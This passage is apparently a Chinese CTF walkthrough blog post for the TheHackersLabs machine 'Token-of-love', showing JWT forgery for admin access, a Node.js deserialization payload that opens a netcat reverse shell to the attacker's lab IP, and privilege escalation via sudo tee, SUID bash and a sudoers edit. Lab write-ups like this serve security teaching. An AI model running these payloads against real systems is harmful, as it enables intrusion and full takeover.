+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJtaWFvIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3Mzk4NDQwODksImV4cCI6MTczOTg0NzY4OX0.UEQT7JzngvLbAkWLfq5mi1EQx1d8DTvZhbV1Cn_yydWlGFNdRTQ_KwTyKY_HGNwxqWXLeIB5jLS81ZH65UI9K82m7JrErLeo-UhXft9s6p__3_wajquk-yd0A_-yT-5i-HXlzY3m_CFjBuItNwgTTWP5fzvnOHqHw2ISsxcXlzpx4v-51cRSPOJIiBfcnn71E3yaVevlO5lU6_se2jAY5iHoSddA1_0YV0HsXkOLf49EcAvHW2xddq7VYNIWacWrFBSTZzByTequMkdsn5y945eczfRMLd92I5iXRRFhVIwqwrhcYevou9jmCyp0Q-8mgOiCSOlyYcc0GS7XNmufnA<br></code></pre></td></tr></table></figure>
+
+<p>使用<code>jwt.io</code>对加密内容进行解密<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502181101901.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload></p>
+<p>根据找到的公钥和私钥，对admin用户进行编码，得到admin用户的cookie<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502181103636.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload></p>
+<p>对cookie进行替换，成功进入admin用户<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502181105678.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload></p>
+<p>抓包测试，发送的消息，所获得的数据包需要修改cookie<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502181107299.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload></p>
+<ul>
+<li>并未执行相关的命令</li>
+</ul>
+<p>修改相关的格式，让其报错，发现是<code>nodejs反序列化</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502181108490.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload></p>
+<p>群里大佬给的poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs node">&#123;&quot;data&quot;:&quot;&#123;\&quot;text\&quot;:\&quot;_$$ND_FUNC$$_function()&#123;require(&#x27;child_process&#x27;).exec(&#x27;nc -e /bin/bash 192.168.2.4 6666&#x27;, function(error,stdout, stderr) &#123; console.log(stdout) &#125;);&#125;( )\&quot;&#125;&quot;&#125;<br></code></pre></td></tr></table></figure>
+<p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502181132088.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload></p>
+<p>成功反弹到shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/thl/token-of-love]<br>└─$ <span class="hljs-built_in">sudo</span> nc -lvnp 6666                          <br>listening on [any] 6666 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.20] 37526<br><span class="hljs-built_in">id</span><br>uid=1000(cupido) gid=1000(cupido) grupos=1000(cupido),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(<span class="hljs-built_in">users</span>),106(netdev)<br></code></pre></td></tr></table></figure>
+<ul>
+<li>获取交换性好的shell<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">script /dev/null -c bash<br><span class="hljs-comment"># 按下 Ctrl+Z 将其挂起</span><br><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span><br><span class="hljs-comment"># 按下回车</span><br>reset xterm<br><span class="hljs-built_in">export</span> TERM=xterm<br><span class="hljs-built_in">export</span> SHELL=/bin/bash<br><span class="hljs-built_in">stty</span> rows 24 columns 80<br></code></pre></td></tr></table></figure>
+找到<code>user.txt</code><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-5.2$ <span class="hljs-built_in">cat</span> /home/cupido/user.txt<br>2032f531b474172175d02465b0a4941c<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h1 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h1><p>查看当前用户被允许以<code>sudo权限</code>执行的命令有哪些</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-5.2$ <span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> cupido on tokenoflove:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,<br>    use_pty<br><br>User cupido may run the following commands on tokenoflove:<br>    (eros) NOPASSWD: /usr/bin/tee<br></code></pre></td></tr></table></figure>
+
+<p>将字符串 <code>chmod +s /bin/bash</code>写入<code>miao.txt</code>，并赋予<code>suid</code>权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-5.2$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;chmod +s /bin/bash&#x27;</span> | <span class="hljs-built_in">sudo</span> -u eros <span class="hljs-built_in">tee</span> /home/eros/miao.txt<br><span class="hljs-built_in">chmod</span> +s /bin/bash<br></code></pre></td></tr></table></figure>
+
+<p>将用户 <code>cupido</code>的 <code>sudo</code>权限配置追加到 <code>/etc/sudoers</code>文件中，并且不需要密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -p<br>bash-5.2$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&#x27;</span>cupido ALL=(ALL:ALL) NOPASSWD:ALL<span class="hljs-string">&#x27; &gt;&gt; /etc/sudoers</span><br></code></pre></td></tr></table></figure>
+
+<p>获取root权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-5.2$ <span class="hljs-built_in">sudo</span> su -                                                <br><span class="hljs-built_in">sudo</span> su -<br>root@tokenoflove:~# <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) grupos=0(root)<br></code></pre></td></tr></table></figure>
+
+<p><strong>ROOT FLAG</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@tokenoflove:~# <span class="hljs-built_in">cat</span> /root/root.txt<br><span class="hljs-built_in">cat</span> /root/root.txt<br>e0772277e3cdf59b65c6b76df5b84ea6<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/thehackerslabs/" class="category-chain-item">thehackerslabs</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/IPFS/" class="print-no-link">#IPFS</a>
+      
+        <a href="/tags/JWT/" class="print-no-link">#JWT</a>
+      
+        <a href="/tags/%E6%8F%90%E6%9D%83-tee/" class="print-no-link">#提权-tee</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Token-of-love</div>
+      <div>http://miao-sec.github.io/thehackerslabs/Token-of-love/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Miao</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年8月21日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              BY-MIAO
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/maze-sec/Chat2/" title="Chat2">
+                        <span class="hidden-mobile">Chat2</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+      <div class="col-lg-7 mx-auto nopadding-x-md">
+        <div class="container custom mx-auto">
+           <link rel="stylesheet" href="/dist/APlayer.min.css"> <div id="aplayer"></div> <script type="text/javascript" src="/dist/APlayer.min.js"></script> <script type="text/javascript" src="/js/music.js"></script> 
+        </div>
+      </div>
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         次
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/scrollAnimation.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
